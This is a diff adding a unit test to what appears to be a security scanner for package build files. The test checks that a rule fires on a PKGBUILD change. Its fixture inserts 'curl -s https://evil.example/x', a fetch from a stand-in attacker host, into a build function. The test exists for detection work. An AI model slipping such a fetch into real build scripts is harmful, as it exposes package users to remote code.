@@ -721,3 +721,22 @@ def test_code_rules_still_fire_in_the_recipe():
     )
     fact = scan_diff(diff, rules=[], package_name="demo", seen_urls={})
     assert [e for e in fact.score_breakdown if e.rule_id == "H025"]
+
+
+def test_function_keyword_headers_are_scoped():
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,3 @@\n"
+        "function build {\n"
+        "+  curl -s https://evil.example/x\n"
+        "}\n"
+    )
+    raw_lines, raw_indices = get_raw_diff_lines_indexed(diff)
+    resolved, _unresolved, indices = tokenize_and_resolve_indexed(diff)
+    triggered = apply_rules(
+        resolved, raw_lines, SHARED_RULES,
+        line_map=map_diff_lines(diff),
+        resolved_indices=indices,
+        raw_indices=raw_indices,
+    )
+    r010 = next(r for r in triggered if r["rule_id"] == "R010")
+    assert r010["file"] == "PKGBUILD"
